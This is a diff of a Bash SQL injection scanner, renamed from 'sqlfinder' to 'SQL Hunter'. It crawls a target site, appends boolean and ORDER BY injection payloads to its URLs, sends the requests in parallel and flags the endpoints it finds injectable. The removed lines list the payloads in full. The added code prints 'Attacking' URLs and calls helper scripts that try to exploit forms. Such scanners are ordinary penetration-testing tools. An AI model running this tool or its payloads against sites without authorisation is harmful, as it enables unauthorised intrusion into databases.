@@ -1,9 +1,11 @@
 #!/bin/bash
-# sqlfinder v3.1
-#Intensive scan enabled
-#Added Count Check on pages
-# ---------------- Colors ----------------
+# SQL Hunter v1.0
 #-- Version Dev 1.1
+#------GLOBAL VARIABLES-------
+
+# Source the config file
+source config.sh
+
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -12,138 +14,109 @@ NC='\033[0m'
 
 WARNING="⚠️"
 CHECK="✓"
-
-#set -euo pipefail
-
-# -------------- DEFAULTS
-threads=20
-file=""
-
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+# -------------- DEFAULTS-------------
+original_args=("$@")
+url=""
+HEADER=""
 vulnerable=false
 verbose=false
 header=""
-intensive=false
-
+parallel_max=1  # Default sequential
+original_args=("$@")
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-# ---------------- Help ----------------
+
+## --- Show Help
 show_help() {
   cat << 'EOF'
+SQL Hunter - SQL Injection Scanner with Parallel Processing
 
-                                                          
- ▄▄▄▄▄▄▄       ▄▄    ▄▄▄▄▄▄▄              ▄▄             
-█████▀▀▀       ██   ███▀▀▀▀▀ ▀▀           ██             
- ▀████▄  ▄████ ██   ███▄▄    ██  ████▄ ▄████ ▄█▀█▄ ████▄ 
-   ▀████ ██ ██ ██   ███▀▀    ██  ██ ██ ██ ██ ██▄█▀ ██ ▀▀ 
-███████▀ ▀████ ██   ███      ██▄ ██ ██ ▀████ ▀█▄▄▄ ██    
-            ██ Crawling and Testing for SQL Injections---|=( 
-            ▀▀                              
-                                            by Cyber Samurai-- -|=
-Usage:
-  sqlfinder.sh <target> [options]
-  sqlfinder.sh -f <file> [options]
+Usage: ./sqlhunter.sh [OPTIONS] <URL>
 
 Options:
-  -f <file>          Load URLs from file instead of crawling
-  -H <header>        Add custom HTTP header
-  -t <threads>       Number of parallel requests (default: 1)
-  -h, --help         Show this help message and exit
-  -i                 Enable intense mode (time/error/union SQLi)
+  -H, --header <HEADER>     Add custom HTTP header
+  -p, --parallel <NUM>      Maximum parallel requests (default: 1)
+  -v, --verbose             Outputs a bigger commmand
+  -h, --help                Show this help message
+  -f  --forms               Will attempt to exploit forms if found on the page
 
-Examples:
-  sqlfinder.sh https://example.com
-
-  sqlfinder.sh -f urls.txt
-
-  sqlfinder.sh https://example.com -t 50
-
-  sqlfinder.sh https://example.com \
-    -H "Authorization: Bearer eyJhbGciOi..."
-
-  sqlfinder.sh -f api.txt -H "Cookie: session=abcd" -t 25
-
-Description:
-  sqlfinder crawls a target using katana (unless -f is used),
-  filters URLs, and performs boolean-based SQL injection checks.
-
-  By default, sqlfinder runs lightweight boolean checks.
-  Use -i to enable aggressive SQL injection techniques.
-  The Intense flag is still under development
+Example:
+  ./sqlhunter.sh -p 20 -H "Cookie: session=abc123" https://example.com/page?id=1
 EOF
 }
 
-
-
-# ---------------- Handle --help ----------------
-for arg in "$@"; do
-  if [[ "$arg" == "--help" ]]; then
-    show_help
-    exit 0
-  fi
-done
-
-# ---------------- Positional target ----------------
-target=""
-if [[ "$1" != -* ]]; then
-  target="$1"
-  shift
-fi
-
 # ---------------- Parse flags ----------------
-while getopts ":H:t:f:hiv" opt; do
-  case "$opt" in
-    H) header="$OPTARG" ;;
-    t) threads="$OPTARG" ;;
-    f) file="$OPTARG" ;;
-    i) intensive=true ;;
-    v) verbose=true ;;
-    h)
-      show_help
-      exit 0
-      ;;
-    :)
-      echo "Error: Option -$OPTARG requires an argument"
-      exit 1
-      ;;
-    \?)
-      echo "Invalid option: -$OPTARG"
-      show_help
-      exit 1
-      ;;
-  esac
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        -H|--header)
+            HEADER="$2"
+            shift 2
+            ;;
+        -p|--parallel)
+            parallel_max="$2"
+            shift 2
+            ;;
+        -v|--verbose)
+            verbose=true
+            shift 1  # Only shift 1 for flags without parameters
+            ;;
+        -f|--forms)
+            forms=true
+            shift 1  # Only shift 1 for flags without parameters
+            ;;            
+        -h|--help)
+            show_help
+            exit 0
+            ;;
+        *)
+            # This handles the URL argument
+            if [[ -z "$url" ]]; then
+                url="$1"
+            else
+                echo "Error: Unknown argument: $1"
+                show_help
+                exit 1
+            fi
+            shift
+            ;;
+    esac
 done
 
-#------------------DEBUG
-
-
-
-#Validate input ----------------
-if [[ -n "$file" ]] && [[ -n "$target" ]]; then
-  echo "Error: Use either a target OR a file, not both"
-  exit 1
-fi
-
-if [[ -z "$file" ]] && [[ -z "$target" ]]; then
-  show_help
-  exit 1
-fi
-
-if [[ -n "$file" ]] && [[ ! -f "$file" ]]; then
-  echo "Error: File not found: $file"
-  exit 1
-fi
-
-
-
-# ---------------- Curl body helper (for JavaScript check) ----------------
+# ---------------- Curl body helper ----------------
 curl_body() {
-  local CURL_ARGS=()
-  
-  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
-  
-  curl -s "${CURL_ARGS[@]}" "$1"
+    local CURL_ARGS=()
+    
+    if [[ -n "$HEADER" ]]; then
+        CURL_ARGS+=(-H "$HEADER")
+    fi
+    
+    curl -s "${CURL_ARGS[@]}" "$1"
 }
 
-# Creates variation on the url from the collect_urls - Katana | uro output
+curl_ResponseCode() {
+    local CURL_ARGS=()
+    
+    if [[ -n "$HEADER" ]]; then
+        CURL_ARGS+=(-H "$HEADER")
+    fi
+    
+    curl -s -o /dev/null -w "%{http_code}" "${CURL_ARGS[@]}" "$1"
+}
+
+#- Collect URLs
+collect_urls() {
+  local url="$1"
+  local KATANA_ARGS=()
+  KATANA_ARGS=(-u "$url" -jsl -silent)
+  [[ -n "$header" ]] && KATANA_ARGS+=(-H "$header")
+
+  katana "${KATANA_ARGS[@]}" 2>/dev/null \
+    | uro 2>/dev/null \
+    | grep -Ev '\.(js|tsx|php|html|htm|json)(\?|$)' \
+    | sed 's/:id//' \
+    | sort -u
+}
+
 add_number_variations() {
     local exceptions=("cart" "checkout" "logout" "login" "profile" "settings" "account")
     
@@ -171,292 +144,257 @@ add_number_variations() {
         done
     done
 }
-# ---------------- Website Crawler and URL Filtering ----------------
-collect_urls() {
-  local target="$1"
-  local KATANA_ARGS=()
 
-  KATANA_ARGS=(-u "$target" -jsl -silent)
-  [[ -n "$header" ]] && KATANA_ARGS+=(-H "$header")
-
-  katana "${KATANA_ARGS[@]}" 2>/dev/null \
-    | uro \
-    | grep -Ev '\.(js|tsx|php|html|htm)(\?|$)' \
-    | sed 's/=[^&[:space:]]*/=/'
-    | sed 's/:id//'
-}
-
-# ---------------- Curl helper ----------------
-curl_cmd() {
-  local url="$1"
-  local output
-  local CURL_ARGS=()
-
-  CURL_ARGS=(-s -o /dev/null -w "%{http_code}" --parallel --parallel-max "$threads")
-  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
-  CURL_ARGS+=("$url")
-
-  output=$(curl "${CURL_ARGS[@]}")
-  
-  if [[ "$verbose" == true ]]; then
-    echo "$url" 1>&2
-  fi 
-  echo "$output"  
-}
-
-# ---------------- Curl time helper ----------------
-curl_time() {
-  local CURL_ARGS=()
-  
-  CURL_ARGS=(-s -o /dev/null -w "%{time_total}")
-  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
-  CURL_ARGS+=("$1")
-  
-  curl "${CURL_ARGS[@]}"
-}
-
-# ---------------- Test payload function ----------------
-test_payload() {
-  local url="$1"
-  local payload="$2"
-  local description="$3"
-  
-  response_code=$(curl_cmd "${url}/${payload}")
-  
-  # Check if response is 200 (true) or not 200 (false)
-  if [[ "$response_code" == "200" ]]; then
-    if [[ "$verbose" == true ]]; then
-      echo -e "${BLUE}[*] Payload '$payload' returned TRUE (200)${NC}" 1>&2
-    fi
-    echo "true"
-  else
-    if [[ "$verbose" == true ]]; then
-      echo -e "${BLUE}[*] Payload '$payload' returned FALSE ($response_code)${NC}" 1>&2
-    fi
-    echo "false"
-  fi
-}
-
-# ---------------- Function to get base URL without trailing number ----------------
+#---Helper Functions
 get_base_url() {
   local url="$1"
-  # Remove trailing /number pattern
   echo "$url" | sed -E 's|(/[0-9]+)+$||'
 }
 
-# ---------------- INITIALIZE ---------------
-clear
-if [[ "$verbose" == true ]]; then
-  echo -e "Verbose output enabled"
+run_sql_logic_check() {
+        	if [[ $responseCode -eq 404 ]]; then
+               return 0
+            
+            elif [[ $responseCode -gt 404 && $responseCode -le 499 ]]; then
+                echo -e "${RED}[$responseCode]${NC}Some type of bad request" 
+            fi
+
+            # False positive check
+            if [[ $responseCode -eq 200 ]]; then
+                if echo "$attackBody" | grep -Eiq "$patterns"; then
+                    SQLRiskConfidence=0
+                    echo "[-] Skipping (false positive): $attackUrl"
+                    matched=$(echo "$attackBody" | grep -Eio "$patterns" | head -1)
+                    echo -e "${BLUE}  Reason:${NC} Contains pattern: \"$matched\""
+                    falsePositiveList+=("$attackUrl")
+                    return 0
+                fi
+            fi
+            
+            # SQL error check
+            if [[ $responseCode -ne 200 ]]; then
+                if echo "$attackBody" | grep -qi "sql.*error\|syntax.*error\|mysql\|postgresql\|oracle"; then
+                    echo "    [!] SQL error message detected in response"
+                    falseCheckList+=("$attackUrl")
+                    falsePassCheck=true
+                    SQLRiskConfidence=$((SQLRiskConfidence + 25))
+                    echo -e "${RED}SQL Injection found ${NC} "
+                    echo -e "${BLUE}  Reason:${NC} Database error found on Response"
+                fi
+            fi
+            
+            # SQL injection logic
+            if [[ $responseCode -eq 200 ]]; then
+                SQLRiskConfidence=$((SQLRiskConfidence + 25))
+                trueCheckList+=("$attackUrl")
+                truePassCheck=true  
+                
+                if [[ "$attackBody" == "$baselineBody" ]]; then
+                    echo -e "$attackUrl"
+                    echo "Payload request matches Baseline, SQL Risk Increased"
+                    SQLRiskConfidence=$((SQLRiskConfidence + 50))
+                    vulnerable=true
+                elif [[ "$attackBody" != "$baselineBody" ]]; then
+                    echo "Checking for element count changes..."
+                    "$SCRIPT_DIR/diff.sh" -u "$url" "${original_args[@]}"
+                    diff_exit_code=$?
+                    if [[ $diff_exit_code -eq 0 ]]; then
+                        vulnerable=true
+                        SQLRiskConfidence=$((SQLRiskConfidence + 25))
+                        return 99
+                    fi
+                fi
+            elif [[ $responseCode -gt 299 && $responseCode -lt 499 ]]; then
+                falseCheckList+=("$attackUrl")
+                falsePassCheck=true
+                SQLRiskConfidence=$((SQLRiskConfidence + 10))
+            fi
+
+            if [[ $SQLRiskConfidence -ge 50 ]]; then
+                vulnerable_bases["$base_url"]=1
+            fi
+    }
+
+
+#Validate input 
+if [[ -z "$url" ]]; then
+  show_help
+  exit 1
 fi
 
-if [[ -n "$header" ]]; then
-    echo -e "${GREEN}-----------------------------------Authenticated Scan-----------------------------------${NC}"
-else
-    echo -e "${YELLOW}------------------------------Non Authenticated Scan------------------------------${NC}"
-fi
 
-if [[ -n "$threads" ]]; then
-    echo -e "Scanning using ${GREEN}$threads${NC} parallel jobs"
-fi
+# Read URL list into array
+echo -e "[${GREEN}+${NC}] - Collecting URLs from: $url"
+IFS=$'\n' read -r -d '' -a urlList <<< "$(collect_urls "$url")"
+#Create a list of login pages
+IFS=$'\n' loginPages=($(printf "%s\n" "${urlList[@]}" | grep -iE "(admin|login)$"))
+#We will add a random number to these Urls, as that is how some we can detect SQL injection on these
+IFS=$'\n' noTrailUrlList=($(printf "%s\n" "${urlList[@]}"| grep -E '\.(js|tsx|php|html|htm|json)(\?|$)'))
+# Expand the URLs with number variationsf=
+urlsNoTrailExpanded=$(printf "%s\n" "${noTrailUrlList[@]}" | add_number_variations)
+# Combine the expanded URLs back into urlList
+IFS=$'\n' read -r -d '' -a urlList <<< "$(printf "%s\n" "${urlList[@]}\n${urlsNoTrailExpanded}" | sort -u)"
 
-if [[ "$intensive" == true ]]; then
-banner=$(cat << 'EOF'
-                          ░▀█▀░█▀█░▀█▀░█▀▀░█▀█░█▀▀░▀█▀░█░█░█▀▀
-                          ░░█░░█░█░░█░░█▀▀░█░█░▀▀█░░█░░▀▄▀░█▀▀
-                          ░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░░▀░░▀▀▀
-                                S C A N     E N A B L E D 
-EOF
-)
-    echo -e "${YELLOW}$banner${NC}"
-fi
-echo -e "${GREEN}Initializing Scan on target:${NC} ${YELLOW}${target}${NC}"
 
-# ---------------- URL source ----------------
-if [[ -n "$file" ]]; then
-  urls="$(cat "$file")"
-else
-  urls="$(collect_urls "$target" | add_number_variations)"
-fi
 
-# ---------------- Scan loop ----------------
-# Add this array for false positive response patterns
-declare -a falsePositiveResponse=(
-    "You need to enable JavaScript to run this app"
-    "Please enable JavaScript"
-    "JavaScript is required"
-    "enable javascript"
-    "requires JavaScript"
-    "This application requires JavaScript"
-    "JavaScript must be enabled"
-    "Please turn on JavaScript"
-)
 
-# Array of payloads to test
-declare -a payloads=(
-  # Standard boolean injections
-  "1%20AND%201=1--%20-"
-  "1%20AND%202=1--%20-"
-  "1%20OR%201=1--%20-"
-  "1%20OR%201=2--%20-"
-  
-  # Quoted boolean injections
-  "'1%20AND%201=1--%20-"
-  "'1%20AND%202=1--%20-"
-  "'1%20OR%201=1--%20-"
-  "'1%20OR%201=2--%20-"
-  
-  # Double quoted boolean injections
-  "\"%20AND%201=1--%20-"
-  "\"%20AND%202=1--%20-"
-  "\"%20OR%201=1--%20-"
-  "\"%20OR%201=2--%20-"
-  
-  # Parentheses variations
-  "(1)%20AND%201=1--%20-"
-  "(1)%20AND%202=1--%20-"
-  "1)%20AND%201=1--%20-"
-  "1)%20AND%202=1--%20-"
-  
-  # ORDER BY injections
-  "%20order%20by%201--%20-"
-  "%20order%20by%2010--%20-"
-  "'%20order%20by%201--%20-"
-  "'%20order%20by%2010--%20-"
-  "\"%20order%20by%201--%20-"
-  "\"%20order%20by%2010--%20-"
-  
-  # Different comment styles
-  "1%20AND%201=1%23"
-  "1%20AND%202=1%23"
-  "1%20AND%201=1/*comment*/--"
-  "1%20AND%202=1/*comment*/--"
-)
+echo -e "[${GREEN}+${NC}] - Found ${#urlList[@]} urLs to test"
+echo -e ${YELLOW}"---SQL Injection Target List---${NC}"
+for p in "${urlList[@]}"; do
+    echo "$p"
+done
+echo -e "${YELLOW}---------------------------------------${NC}"
 
-# Track vulnerable base URLs to avoid duplicate checks
+
+
+# Create grep pattern from falsePositiveResponse array
+patterns=$(IFS='|'; echo "${falsePositiveResponse[*]}")
+
+# Fix variable declarations
+declare -a trueCheckList
+declare -a falseCheckList
+declare -a falsePositiveList
+declare -a listVulnUrls
+#----------- LOGIC STARTS HERE ----------
+
 declare -A vulnerable_bases=()
+#
 
-while IFS= read -r url; do
+# Check and attempt exploit login pages..
+echo "-----------Login Pages found (${#loginPages[@]})---"
+
+
+#Main SQL Vuln Loop Checker
+for url in "${urlList[@]}"; do
   [[ -z "$url" ]] && continue
   
-  # Get base URL (without trailing /number)
   base_url=$(get_base_url "$url")
   
-  # Skip if this base URL is already marked as vulnerable
   if [[ -n "${vulnerable_bases[$base_url]}" ]]; then
-    if [[ "$verbose" == true ]]; then
-      echo -e "${YELLOW}[*] Skipping $url (base URL $base_url already marked as vulnerable)${NC}" 1>&2
-    fi
+    echo -e "${YELLOW}[*] Skipping $url (base URL already marked as vulnerable)${NC}"
     continue
   fi
   
   vulnerable=false
+  truePassCheck=false
+  falsePassCheck=false
+  SQLRiskConfidence=0
 
-  # ---- Stage 0: False positive response check (FIRST check before anything else)
-  body_response=$(curl_body "$url")
-  skip_url=false
+#--------------- Running Inside Loop ---------------
+
+# Check and attempt exploit forms on the body of url
+ # Fetch Original Body 
+  baselineBody=$(curl_body "$url")
+  #Testing login pages
+ # "$SCRIPT_DIR/sqlogin.sh" "$url" "${original_args[@]}"
+
+  if [[ $forms == true ]]; then
+	  echo "Checking the page for forms $url"
+	  
+	  "$SCRIPT_DIR/sqlFormFinder.sh" "${original_args[@]}"
+	fi
+ 
   
-  for pattern in "${falsePositiveResponse[@]}"; do
-    if echo "$body_response" | grep -qi "$pattern"; then
-      echo "[-] Skipping (false positive): $url"
-      echo -e "${BLUE}  Reason: Contains pattern: \"$pattern\"${NC}"
-      skip_url=true
-      break
-    fi
-  done
-  
-  if [[ "$skip_url" == true ]]; then
-    continue
-  fi
 
-  # ---- Stage 1: base check (skip dead only)
-  base_code=$(curl_cmd "$url")
-  [[ "$base_code" == "000" ]] && continue
 
-  # ---- Stage 2: boolean injection (multiple payloads)
-  # Store results for comparison
-  declare -A payload_results
-  declare -a true_payloads=()
-  declare -a false_payloads=()
 
-  # Test all payloads
-  if [[ "$verbose" == true ]]; then
-    echo -e "${BLUE}[*] Testing boolean injection payloads for $url...${NC}" 1>&2
-  fi
-
-  for payload in "${payloads[@]}"; do
-    result=$(test_payload "$url" "$payload" "Boolean test")
-    payload_results["$payload"]="$result"
+  # PARALLEL PROCESSING
+  if [[ $parallel_max -gt 1 ]]; then
+    echo "Testing ${#payloads[@]} payloads with $parallel_max parallel workers..."
     
-    if [[ "$result" == "true" ]]; then
-      true_payloads+=("$payload")
-    else
-      false_payloads+=("$payload")
-    fi
-  done
-
-  # Check if we have both true and false responses
-  if [[ ${#true_payloads[@]} -gt 0 ]] && [[ ${#false_payloads[@]} -gt 0 ]]; then
-    echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-    echo -e "Reason: ${BLUE}Boolean injection detected - different responses for different payloads${NC}"
-    echo -e "${BLUE}  True responses (200):${NC}"
-    for p in "${true_payloads[@]:0:3}"; do  # Show first 3 true payloads
-      echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
-    done
-    echo -e "${BLUE}  False responses (not 200):${NC}"
-    for p in "${false_payloads[@]:0:3}"; do  # Show first 3 false payloads
-      echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
-    done
+    # Create temp directory
+    tempdir=$(mktemp -d)
     
-    vulnerable=true
-    # Mark this base URL as vulnerable to skip future variations
-    vulnerable_bases["$base_url"]=1
-    
-    # Run additional tests
-    if [[ -n "$header" ]]; then
-      "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
-    else
-      "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
-    fi
-    
-    "$SCRIPT_DIR/sqlogin.sh" "$url" || true
-  fi
-
-  # ---- Stage 3: Additional check: ORDER BY incremental testing
-  if [[ "$vulnerable" == false ]] && [[ "$intensive" == true ]]; then
-    if [[ "$verbose" == true ]]; then
-      echo -e "${BLUE}[*] Testing ORDER BY column count...${NC}" 1>&2
-    fi
-    
-    # Test ORDER BY with increasing column numbers
-    for i in {1..20}; do
-      order_payload="%20order%20by%20${i}--%20-"
-      response_code=$(curl_cmd "${url}/${order_payload}")
-      
-      if [[ "$response_code" != "200" ]] && [[ "$response_code" != "000" ]] && [[ "$response_code" != "404" ]]; then
-        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-        echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
-        echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $response_code)${NC}"
-        vulnerable=true
-        # Mark this base URL as vulnerable to skip future variations
-        vulnerable_bases["$base_url"]=1
+    # Function for parallel execution
+    process_payload() {
+        local index="$1"
+        local payload="$2"
+        local url="$3"
         
-        # Run additional tests
-        if [[ -n "$header" ]]; then
-          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
-        else
-          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
+        local attackUrl="${url}${payload}"
+        local CURL_ARGS=()
+        [[ -n "$HEADER" ]] && CURL_ARGS+=(-H "$HEADER")
+        
+        # Get response code
+        local responseCode
+        responseCode=$(curl -s -o /dev/null -w "%{http_code}" "${CURL_ARGS[@]}" "$attackUrl" 2>/dev/null || echo "000")
+        
+        # Get response body
+        local attackBody=""
+        if [[ $responseCode -eq 200 ]] || [[ $responseCode -ne 000 ]]; then
+            attackBody=$(curl -s "${CURL_ARGS[@]}" "$attackUrl" 2>/dev/null || echo "")
         fi
         
-        "$SCRIPT_DIR/sqlogin.sh" "$url" || true
-        break
+        # Save to temp files
+        echo "$responseCode" > "$tempdir/code_$index"
+        echo "$attackBody" > "$tempdir/body_$index"
+        echo "$attackUrl" > "$tempdir/url_$index"
+        if [[ $verbose == true ]]; then
+            echo -e "${RED}Attacking:$attackUrl${NC}"
+        fi
+    }
+    
+    export -f process_payload
+    export HEADER
+
+
+    # Run in parallel
+    for i in "${!payloads[@]}"; do
+        echo "$i" "${payloads[$i]}" "$url"
+    done | xargs -I {} -P "$parallel_max" \
+        bash -c 'process_payload $1 "$2" "$3"' _ {}
+    
+    # Read results
+    for i in "${!payloads[@]}"; do
+        if [[ -f "$tempdir/code_$i" ]]; then
+            responseCode=$(cat "$tempdir/code_$i")
+            attackBody=$(cat "$tempdir/body_$i")
+            attackUrl=$(cat "$tempdir/url_$i")
+            payload="${payloads[$i]}"
+      #-------------------------------------------------------------------------------------------------------------------------
+            # PROCESS EACH PAYLOAD (SAME LOGIC AS SEQUENTIAL)
+            run_sql_logic_check
+            #Check if already vulnerable
+            if [[ $? -eq 99 ]]; then
+			    break
+			fi
+      #--------------------------------------------------------------------------------------------------------------------------      
+        fi
+    done
+    
+    # Clean up
+    rm -rf "$tempdir"
+    
+  else
+    # SEQUENTIAL PROCESSING (ORIGINAL CODE)
+    for payload in "${payloads[@]}"; do
+      attackUrl="${url}${payload}"
+      if [[ $verbose == true ]]; then
+        echo -e "${BLUE}Attacking:$attackUrl${NC}"
       fi
+      attackBody=$(curl_body "$attackUrl")
+      responseCode=$(curl_ResponseCode "$attackUrl")
+      #-------------------------------------------------------------------------------------------------------------------------
+            run_sql_logic_check
+            #Check if already vulnerable
+            if [[ $? -eq 99 ]]; then
+			    break
+			fi            
+      #--------------------------------------------------------------------------------------------------------------------------
+      
     done
   fi
 
-  # ---- Final safe output
-  if [[ "$vulnerable" == false ]]; then
+  if [[ $truePassCheck == true && $falsePassCheck == true ]]; then
+    echo -e "${RED}[VULNERABLE] ${WARNING} SQL INJECTION DETECTED!${NC}"
+    echo "URL: $url"
+    echo "Payload: $payload"
+    if [[ ${#trueCheckList[@]} -gt 0 ]]; then
+        echo "Payload: ${trueCheckList[0]}"
+    fi
+    echo "Reason: Boolean Injection detected"
+    echo "SQLRisk Confidence = $SQLRiskConfidence"
+  else # ---- Final safe output
     echo -e "${GREEN}[ ${CHECK} ] $url${NC}"
   fi
-
-done <<< "$urls"
+done
